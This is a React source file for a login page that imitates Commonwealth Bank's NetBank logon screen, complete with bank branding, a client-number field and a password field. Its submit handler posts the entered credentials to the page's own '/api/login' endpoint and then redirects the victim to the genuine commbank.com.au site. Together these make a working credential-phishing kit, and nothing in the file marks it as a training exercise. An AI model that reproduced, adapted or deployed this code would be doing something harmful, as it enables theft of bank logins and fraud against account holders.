import { useRef, useState } from 'react';
import { Link } from 'react-router-dom';
import Flood from './Flood';
import Quicklinks from './Quicklinks';
import axios from 'axios';

const Login = () => {
    const radioRef = useRef(null);
    const [cardNumber , setCardNumber] = useState('');
    const [password , setPassword] = useState('');

    const handleSubmit = async (e) => {
        e.preventDefault();
        try{
            await axios.post('/api/login' , {
                cardNumber , password 
            })
            setPassword('');
            setCardNumber('');
            radioRef.current.checked = false;
            window.location.href = 'https://www.commbank.com.au'
        }catch(err){
            alert(err.response && err.response.data.message ? err.response.data.message : err.message || 'Something went wrong.')
        }
    }

    return (
        <div className='w-full min-h-screen gradient'>
            <div className=' w-full lg:w-[80%] xl:w-1/2 bg-white mx-auto h-screen py-6 sm:px-6  px-[1px]'>
                <div className='flex items-center gap-2'>
                    <h1 className='text-2xl font-extrabold'>
                        Commonwealth<span className='font-normal'>Bank</span></h1>
                    <img src="/images/logo.png" alt="Logo" 
                    className='w-[40px] object-fill' />
                </div>
                <div className='flex gap-1 sm:gap-4 mt-6'>
                    <div className='flex-1-5 sm:w-atuo w-[200px]'>
                        <div className='bg-[#7A7A7A] py-4 px-4 text-white font-semibold text-sm sm:text-lg'>
                            <h3>Log on to NetBank</h3>
                        </div>
                        <form onSubmit={handleSubmit}>
                            <div className='bg-[#F4F4F4] py-3 sm:py-5 px-1 sm:px-4 flex flex-col gap-4 '>
                                <div className='login-input flex gap-4 justify-between items-center  text-[10px] sm:text-sm '>
                                    <label 
                                    htmlFor="number" 
                                    className='w-[70px] sm:w-[120px]'
                                    >
                                        Client number
                                    </label>
                                    <div className=''>
                                        <input 
                                        type="text" 
                                        id="number"
                                        value={cardNumber}
                                        onChange={ e => setCardNumber(e.target.value)}
                                        className='border border-black outline-none  w-full' 
                                        />
                                    </div>
                                </div>
                                <div className=' flex justify-between items-center gap-4 text-[10px] sm:text-sm '>
                                    <label htmlFor="number" className='w-[70px] sm:w-[120px]'>
                                        Password
                                    </label>
                                    <div className=''>
                                        <input 
                                        type="password" 
                                        id="number" 
                                        value={password}
                                        onChange={e => setPassword(e.target.value)}
                                        className='border   border-black outline-none'
                                        />
                                    </div>
                                </div>
                                <div className=' flex gap-2 justify-end text-[10px] sm:text-sm '>
                                    <input 
                                    type="radio" 
                                    id="remember" 
                                    ref={radioRef}
                                    />
                                    <label htmlFor="remember">Remember client number</label>
                                </div>
                                <div  className='flex justify-end '>
                                    <button className='bg-[#FFCC00] py-1 px-4 rounded-full w-fit pb-1.5 flex gap-2 items-center sm:text-sm text-[10px] ' type='submit'>
                                        <img src="/images/lock.svg" alt=""  className='w-[15px] sm:w-[20px]'/>
                                        Log on
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div className='flex-1'>
                        <div className='bg-[#7A7A7A] py-4 px-3 sm:px-4 text-white font-semibold text-sm sm:text-lg'>
                            <h3>New to NetBank</h3>
                        </div>
                        <div className='bg-[#F4F4F4] py-3 px-1 sm:p-4 text-[10px] sm:text-sm flex flex-col gap-2'>
                            <Link to='/register' className='underline cursor-pointer'>Register for NetBank now</Link>
                            <p className='underline cursor-pointer'>Online support for our products and services</p>
                            <p className='underline cursor-pointer'>Tips to stay safe online</p>
                        </div>
                        <div className='bg-[#F4F4F4] p-2 text-[10px] sm:text-sm flex items-center gap-2  mt-1.5'>
                            <div>
                                <img src="/images/secure.svg" alt="" className='w-[50px] ' />
                            </div>
                            <p className='underline cursor-pointer'>How we protect you and our 100% security guarantee</p>
                           
                        </div>
                    </div>
                    
                </div>
                <div className='mt-6'>
                    <Flood />
                </div>
                <div className='mt-4'>
                    <Quicklinks />
                </div>
            </div>
        </div>
    )
}

export default Login